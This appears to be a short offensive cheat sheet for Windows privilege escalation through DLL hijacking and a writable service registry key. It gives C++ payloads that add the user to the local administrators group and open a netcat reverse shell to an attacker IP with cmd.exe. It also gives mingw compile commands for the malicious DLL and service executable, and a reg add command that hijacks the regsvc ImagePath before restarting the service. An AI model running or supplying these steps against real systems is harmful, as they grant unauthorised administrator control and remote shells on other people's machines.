# Windows Service and DLL Hijacking

## Update the `Run()` Function

## 1. Add your self to Administrative group

This command will add you in the administrator group:

```cpp
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 
```


---

## 2. Reverse Shell

This command will give  you a reverse shell  with administrative privileges:

```cpp
int Run() 
{ 
    system("C:\Temp\nc.exe <Attacker IP> <PORT> -e cmd.exe");
    return 0; 
} 
```

```
Note: Please add the nc.exe file in the C:\Temp directory and if Temp directory dosen't exists create it. 
```


## Commands for Compiling DLL:

### In Attacker Machine

For x64 compile with:
```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

For x86 compile with:
```
i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```


### In Windows machine

1. Place hijackme.dll in ‘C:\Temp’.
2. Open command prompt and type: sc stop dllsvc & sc start dllsvc

---

## Commands for Compiling Service:

### In Windows:
1. Open powershell prompt and type: ``` Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl ```
2. Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

### In Attacker Machine

For x64 compile with:
```bash
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

For x86 compile with:
```
i686-w64-mingw32-gcc windows_service.c -o x.exe
```


### In Windows machine

1. Place x.exe in ‘C:\Temp’.
2. Open command prompt at type: ``` reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\x.exe /f ```
3. In the command prompt type: ``` sc start regsvc```